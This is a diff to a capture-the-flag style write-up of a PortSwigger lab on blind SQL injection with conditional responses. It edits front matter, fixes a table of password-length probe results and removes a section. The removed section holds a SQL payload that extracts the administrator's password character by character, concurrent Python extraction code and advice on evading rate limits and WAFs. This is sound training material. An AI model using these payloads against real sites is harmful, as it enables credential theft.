@@ -1,11 +1,29 @@
 ---
 layout: writeup
-title: "PortSwigger Lab: Blind SQL Injection with Conditional Responses"
+title: "Blind SQLi: Conditional Responses"
 platform: "PortSwigger"
-os: "web"
+os: "Web"
 difficulty: "Practitioner"
 date: 2025-12-05
-tags: [sql-injection, blind-sqli, web-security, portswigger, credential-extraction, python-automation]
+tags: [sql-injection, blind-sqli, bscp, python, burp-suite]
+excerpt: "Exploiting boolean-based blind SQL injection to extract credentials character by character using conditional responses."
+toc:
+  - title: "Lab Overview"
+    anchor: "lab-overview"
+  - title: "Understanding Blind SQLi"
+    anchor: "understanding-boolean-based-blind-sql-injection"
+  - title: "Confirming the Vulnerability"
+    anchor: "phase-1-confirming-the-vulnerability"
+  - title: "Database Fingerprinting"
+    anchor: "phase-2-database-fingerprinting"
+  - title: "Password Length"
+    anchor: "phase-3-password-length-determination"
+  - title: "Character Extraction"
+    anchor: "phase-4-character-by-character-extraction"
+  - title: "Lab Completion"
+    anchor: "phase-6-lab-completion"
+  - title: "Key Concepts"
+    anchor: "key-concepts-summary"
 ---
 
 # Blind SQL Injection: Exploiting Conditional Responses for Credential Extraction
@@ -265,10 +283,10 @@ Manual testing of every possible length (1 through 50+) is tedious. Burp Suite's
 
 | Payload | Status | Response Length | Welcome back |
 |---------|--------|-----------------|--------------|
-| 18 | 200 | 3456 | 59 |
-| 19 | 200 | 3456 | 59 |
+| 18 | 200 | 59 | X |
+| 19 | 200 | 59 | X |
 | **20** | 200 | **70** | **✓** |
-| 21 | 200 | 3456 | 59 |
+| 21 | 200 | 59 | X |
 
 The password is 20 characters long. The response length difference reflects the additional "Welcome back" content.
 
@@ -477,54 +495,6 @@ if __name__ == "__main__":
 [+] Password: *******
 ```
 
-## Phase 5: Advanced Optimization Techniques
-
-### Binary Search Optimization
-
-Rather than testing each character sequentially (O(n) per position), binary search reduces complexity to O(log n):
-
-```sql
--- Instead of: is char = 'a'? is char = 'b'? is char = 'c'?
--- Ask: is char > 'm'?
-
-' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator') > 109-- -
-```
-
-The ASCII function converts a character to its numeric value, enabling greater-than/less-than comparisons. For a 36-character alphabet:
-
-- **Sequential search:** Average 18 requests per character
-- **Binary search:** Maximum 6 requests per character (log₂(36) ≈ 5.17)
-
-For a 20-character password:
-- **Sequential:** ~360 requests
-- **Binary search:** ~120 requests (3x faster)
-
-### Concurrent Extraction
-
-Each character position is independent, allowing parallel extraction. Using Python's threading or async capabilities:
-
-```python
-import concurrent.futures
-
-def extract_character(position):
-    """Extract a single character at the given position."""
-    for char in CHARSET:
-        payload = build_payload(position, char)
-        if test_payload(payload):
-            return (position, char)
-    return (position, None)
-
-# Extract all positions concurrently
-with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-    futures = [executor.submit(extract_character, pos) for pos in range(1, 21)]
-    results = [f.result() for f in concurrent.futures.as_completed(futures)]
-
-# Sort by position and reconstruct password
-password = ''.join(char for pos, char in sorted(results))
-```
-
-**Warning:** Excessive concurrency may trigger rate limiting or WAF rules. Balance speed against stealth.
-
 ### Conditional Response Variations
 
 The "Welcome back" message used in this PortSwigger lab is just one example of a conditional response. Real-world applications may exhibit different indicators:
@@ -581,9 +551,9 @@ Effective defense requires addressing the root cause: unsanitized input reaching
 
 ---
 
-**Lab:** PortSwigger Web Security Academy
-**Category:** SQL Injection
-**Difficulty:** Practitioner
+**Lab:** PortSwigger Web Security Academy  
+**Category:** SQL Injection  
+**Difficulty:** Practitioner  
 **Technique:** Blind SQL Injection with Conditional Responses
 
 ## References
